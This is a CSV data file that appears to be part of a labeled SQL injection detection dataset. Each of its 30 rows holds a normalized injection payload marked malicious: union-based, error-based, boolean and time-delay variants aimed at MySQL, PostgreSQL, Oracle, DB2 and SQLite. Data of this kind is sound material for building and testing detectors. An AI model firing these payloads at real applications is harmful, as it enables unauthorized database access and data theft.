row_index,payload_norm,label,sqli_type_hint
9720,1' where 6409 = 6409,1,
9721,"-4346' ) or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",1,
9722,1 where 4003 = 4003 union all select null--,1,
9723,"1"" ) and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",1,
9724,1 ) where 1929 = 1929 and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) --,1,
9725,"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 ) from dual and ( ( ( 'knbx' like 'knbx",1,
9726,"1 ) as cfnz where 6065 = 6065 union all select null,null,null,null,null,null,null,null,null#",1,
9727,"1 ) ) as henn where 9980 = 9980 or 4915 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1,
9728,"1' ) where 3375 = 3375 or 8315 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1,
9729,"1'|| ( select 'akye' where 9242 = 9242 union all select null,null,null,null,null,null#",1,
9730,"1"" where 2235 = 2235 union all select null,null,null,null,null--",1,
9731,"1"" ) ) or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( ( ""tfso"" = ""tfso",1,
9732,-6086' ) ) or ( 6719 = 7280 ) *7280 and ( ( 'ozbj' = 'ozbj,1,
9733,"1 where 2146 = 2146 or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",1,
9734,"1 and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) # qmkh",1,
9735,1%' ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( '%' = ',1,
9736,"1 ) as kjsd where 1670 = 1670 or 1022 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1,
9737,"-2987"" ) as iyob where 7827 = 7827 or ( 8459 = 8459 ) *4906--",1,
9738,"-6368 ) ) union all select 4646,4646,4646,4646,4646,4646,4646--",1,
9739,-6947' ) ) as qqjp where 6700 = 6700 union all select 6700#,1,
9740,-2604 ) ) as sekb where 6897 = 6897 or 1000 = 7683,1,
9741,"1"" union all select null,null,null,null,null,null,null,null,null,null--",1,
9742,1' ) ) ) rlike ( select ( case when ( 4076 = 4881 ) then 1 else 0x28 end ) ) and ( ( ( 'grzs' = 'grzs,1,
9743,-2751 where 6334 = 6334 or ( 9668 = 5845 ) *5845--,1,
9744,1'+ ( select 'rejz' where 1530 = 1530 and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) ) +',1,
9745,1' ) ) as jbcd where 9078 = 9078 and 6969 = ( select 6969 from pg_sleep ( 5 ) ) --,1,
9746,"1 ) and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 )",1,
9747,"select count ( * ) from generate_series ( 1,5000000 ) and ( 'qpdu' = 'qpdu",1,
9748,"1%' ) procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) and ( '%' = '",1,
9749,-3246%' union all select 4012#,1,
